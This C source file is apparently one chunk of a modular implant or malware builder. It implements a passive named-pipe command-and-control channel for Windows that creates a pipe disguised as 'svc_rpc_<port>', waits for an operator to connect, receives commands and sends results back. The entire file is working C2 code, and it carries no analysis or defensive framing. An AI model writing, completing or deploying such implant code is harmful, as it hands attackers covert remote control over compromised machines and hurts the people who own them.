// chunk: c2/triggered_pipe
// depends: core/emit_buffer
// provides: c2_connect, c2_recv_cmd, c2_send_result, c2_disconnect
// headers: windows.h
// note: Named pipe C2 — passive, waits for operator connection via named pipe

#ifndef CHUNK_C2_TRIGGERED_PIPE
#define CHUNK_C2_TRIGGERED_PIPE

static HANDLE g_pipe = INVALID_HANDLE_VALUE;

static int c2_connect(const char *host, int port) {
    (void)host;
    char pipe_name[256];
    snprintf(pipe_name, sizeof(pipe_name), "\\\\.\\pipe\\svc_rpc_%d", port);

    g_pipe = CreateNamedPipeA(pipe_name,
        PIPE_ACCESS_DUPLEX,
        PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
        1, 65536, 65536, 0, NULL);

    if (g_pipe == INVALID_HANDLE_VALUE) return 0;

    if (!ConnectNamedPipe(g_pipe, NULL) && GetLastError() != ERROR_PIPE_CONNECTED) {
        CloseHandle(g_pipe);
        g_pipe = INVALID_HANDLE_VALUE;
        return 0;
    }
    return 1;
}

static int c2_recv_cmd(char *buf, int buf_sz) {
    if (g_pipe == INVALID_HANDLE_VALUE) return 0;
    DWORD read_bytes = 0;
    if (!ReadFile(g_pipe, buf, (DWORD)(buf_sz - 1), &read_bytes, NULL))
        return 0;
    buf[read_bytes] = '\0';
    return (int)read_bytes;
}

static int c2_send_result(const char *data, int len) {
    if (g_pipe == INVALID_HANDLE_VALUE) return 0;
    DWORD written = 0;
    WriteFile(g_pipe, data, (DWORD)len, &written, NULL);
    FlushFileBuffers(g_pipe);
    return (int)written;
}

static void c2_disconnect(void) {
    if (g_pipe != INVALID_HANDLE_VALUE) {
        DisconnectNamedPipe(g_pipe);
        CloseHandle(g_pipe);
        g_pipe = INVALID_HANDLE_VALUE;
    }
}

#endif
